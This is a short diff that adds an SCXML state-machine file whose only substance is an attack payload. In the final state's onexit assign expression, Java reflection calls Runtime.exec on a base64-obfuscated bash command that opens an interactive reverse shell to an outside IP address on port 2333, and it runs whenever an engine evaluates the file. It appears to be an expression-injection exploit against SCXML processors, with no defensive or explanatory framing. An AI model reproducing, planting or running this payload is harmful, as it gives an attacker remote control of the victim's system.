@@ -1,0 +1,8 @@
+<?xml version="1.0"?>
+<scxml xmlns="http://www.w3.org/2005/07/scxml" version="1.0" initial="run">
+    <final id="run">
+        <onexit>
+            <assign location="flag" expr="''.getClass().forName('java.lang.Runtime').getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzMC4xMzEuMTQ0LzIzMzMgMD4mMQ==}|{base64,-d}|{bash,-i}')"/>
+        </onexit>
+    </final>
+</scxml>
